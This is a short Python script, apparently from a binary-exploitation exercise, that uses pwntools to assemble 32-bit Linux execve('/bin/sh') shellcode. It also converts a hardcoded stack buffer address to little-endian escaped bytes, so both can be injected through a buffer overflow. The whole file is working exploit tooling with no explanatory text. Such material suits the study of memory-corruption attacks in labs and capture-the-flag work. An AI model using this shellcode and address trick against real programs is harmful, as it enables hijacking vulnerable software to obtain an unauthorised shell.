#!/usr/bin/python
import pwn
import sys

def addBackslashX(input):
    return ''.join(['\\x' + input[i:i+2] for i in range(0, len(input), 2)])

def invertEndian(hexcode):
	return ''.join(hexcode[i:i+2] for i in range(len(hexcode)-2, -2, -2))

#execve("/bin/sh")
bufferAddress = 'ffffd6cc'
hexCode = pwn.asm('''
                  xor eax, eax
                  xor ecx, ecx
                  xor edx, edx
                  xor edi, edi
                  xor esi, esi
                  
                  push edx
                  push 0x68732f2f
                  push 0x6e69622f
                  
                  mov ebx, esp
                  mov al, 0x0b
                  int 0x80
                  ''').hex()

addressCode = addBackslashX(invertEndian(bufferAddress))
sys.stdout.write('\nAddress:\n' + addressCode + '\n')

shellCode = addBackslashX(hexCode)
sys.stdout.write('\nShellcode:\n' + shellCode + '\n')
